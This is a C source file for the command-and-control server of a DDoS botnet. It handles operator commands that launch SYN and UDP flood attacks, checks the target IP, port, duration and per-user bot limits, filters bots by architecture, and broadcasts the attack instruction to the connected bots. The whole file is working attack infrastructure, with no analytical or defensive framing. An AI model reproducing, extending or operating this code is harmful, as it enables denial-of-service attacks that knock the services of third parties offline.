#include "headers/attack_commands.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <pthread.h>
#include <arpa/inet.h>

extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t cooldown_mutex;
extern int global_cooldown;
extern int bot_count;


static int parse_normal_options(const User *user, const char *arg, AttackOptions *options, char *response);

static int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}

void init_attack_options(AttackOptions *options) {
    memset(options, 0, sizeof(AttackOptions));
}

static int validate_attack_base(const User *user, const char *cmd, const char *ip, int time, char *response) {
    if (!validate_ip_or_subnet(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid IP/subnet or time\n" RESET);
        return 0;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Cannot attack private/reserved IP addresses\n" RESET);
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Target is blacklisted\n" RESET);
        }
        return 0;
    }
    
    return 1;
}

static int parse_normal_options(const User *user, const char *arg, AttackOptions *options, char *response) {
    if (strncmp(arg, "psize=", 6) == 0) {
        if (options->has_psize) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate psize argument\n" RESET);
            return 0;
        }
        const char *val = arg + 6;
        char *dash = strchr(val, '-');
        if (dash && dash != val) {
            char min_str[32];
            strncpy(min_str, val, dash - val);
            min_str[dash - val] = 0;
            if (!is_valid_int(min_str) || !is_valid_int(dash + 1)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid psize range (need min-max, both ints)\n" RESET);
                return 0;
            }
            int pmin = atoi(min_str);
            int pmax = atoi(dash + 1);
            if (pmin < 1 || pmax < 1 || pmin > 1500 || pmax > 1500 || pmin > pmax) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid psize range (1-1500, min <= max)\n" RESET);
                return 0;
            }
            options->psize_min = pmin;
            options->psize_max = pmax;
            options->psize = pmin;
        } else {
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid psize (need int or min-max)\n" RESET);
                return 0;
            }
            int psize = atoi(val);
            if (psize < 1 || psize > 1500) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid psize (1-1500)\n" RESET);
                return 0;
            }
            options->psize = psize;
            options->psize_min = psize;
            options->psize_max = psize;
        }
        options->has_psize = 1;
    } 
    else if (strncmp(arg, "srcport=", 8) == 0) {
        if (options->has_srcport) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate srcport option\n" RESET);
            return 0;
        }
        const char *val = arg + 8;
        if (!is_valid_int(val)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid srcport (need int)\n" RESET);
            return 0;
        }
        options->srcport = atoi(val);
        if (!validate_srcport(options->srcport)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid srcport value (must be 1-65535)\n" RESET);
            return 0;
        }
        options->has_srcport = 1;
    }
    else if (strncmp(arg, "sarch=", 6) == 0) {
        if (options->has_sarch) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate sarch argument\n" RESET);
            return 0;
        }
        strncpy(options->sarch, arg + 6, sizeof(options->sarch) - 1);
        options->sarch[sizeof(options->sarch) - 1] = 0;
        options->has_sarch = 1;
    }
    else if (strncmp(arg, "botcount=", 9) == 0) {
        if (options->has_botcount) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate botcount argument\n" RESET);
            return 0;
        }
        const char *val = arg + 9;
        if (!is_valid_int(val)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid botcount (need int)\n" RESET);
            return 0;
        }
        options->botcount = atoi(val);
        if (options->botcount <= 0) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid botcount (must be > 0)\n" RESET);
            return 0;
        }
        if (options->botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Cancelled attack, your max bots are (%d)\n" RESET, user->maxbots);
            return 0;
        }
        options->has_botcount = 1;
    }
    return 1;
}

static void parse_base_args(char *argstr, char **args, int *arg_count) {
    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && *arg_count < 127) {
            args[*arg_count] = token;
            (*arg_count)++;
            token = strtok(NULL, " ");
        }
    }
}

int is_attack_command(const char *command) {
    return strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!udpplain", 9) == 0;
}

static void send_attack(const User *user, const char *command, const AttackOptions *options, char *response) {
    pthread_mutex_lock(&bot_mutex);
    int requested_bots = options->has_botcount ? options->botcount : (user->maxbots < bot_count ? user->maxbots : bot_count);
    int sent_bots = 0;

    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        
        if (options->has_sarch) {
            int arch_match = 0;
            char *saveptr1;
            char sarch_copy[128];
            strncpy(sarch_copy, options->sarch, sizeof(sarch_copy)-1);
            sarch_copy[sizeof(sarch_copy)-1] = 0;
            char *tok = strtok_r(sarch_copy, ",", &saveptr1);
            while (tok) {
                if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                tok = strtok_r(NULL, ",", &saveptr1);
            }
            if (!arch_match) continue;
        }

        if (sent_bots >= requested_bots) break;

        send(bots[i].socket, command, strlen(command), MSG_NOSIGNAL);
        sent_bots++;
    }

    pthread_mutex_unlock(&bot_mutex);

    if (sent_bots == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "No matching bots found\n" RESET);
        return;
    }

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mbroadcasted instructions to %d bots\033[0m\n", sent_bots);

    char cmd[16], target[32];
    int port = 0, time = 0;
    
    if (sscanf(command, "%15s %31s %d %d", cmd, target, &port, &time) >= 4) {
        pthread_mutex_lock(&cooldown_mutex);
        global_cooldown = time;
        pthread_mutex_unlock(&cooldown_mutex);
    }
}

void handle_udpplain_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int time = 0;
    AttackOptions options;
    init_attack_options(&options);

    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    int port = 0;
    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !udpplain <ipv4> <dport> <time> [options]\n" RESET);
        return;
    }

    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }

    if (!validate_attack_base(user, cmd, ip, time, response)) {
        return;
    }

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "psize=", 6) == 0 ||
            strncmp(args[i], "botcount=", 9) == 0 ||
            strncmp(args[i], "sarch=", 6) == 0 ||
            strncmp(args[i], "usleep=", 7) == 0 ||
            strncmp(args[i], "msg=", 4) == 0) {
            if (!parse_normal_options(user, args[i], &options, response)) {
                return;
            }
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Unknown argument: %s\n" RESET, args[i]);
            return;
        }
    }

    send_attack(user, command, &options, response);
}

void handle_syn_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int port = 0, time = 0;
    AttackOptions options;
    init_attack_options(&options);

    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));

    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !syn <ipv4> <dport> <time> [options]\n" RESET);
        return;
    }

    if (result == 4) {
        argstr[0] = '\0';
    }

    if (!validate_attack_base(user, cmd, ip, time, response)) {
        return;
    }

    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);

    for (int i = 0; i < arg_count; i++) {
        if (!parse_normal_options(user, args[i], &options, response)) {
            return;
        }
    }

    send_attack(user, command, &options, response);
}


